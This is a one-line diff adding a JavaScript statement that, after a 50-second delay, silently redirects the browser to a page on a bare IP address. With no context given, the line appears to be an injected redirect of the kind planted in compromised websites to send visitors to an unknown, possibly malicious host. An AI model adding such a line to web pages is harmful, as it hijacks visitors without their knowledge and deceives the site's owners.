@@ -1,0 +1,1 @@
+setTimeout("location.href = 'http://158.255.47.199/home';", 50000);
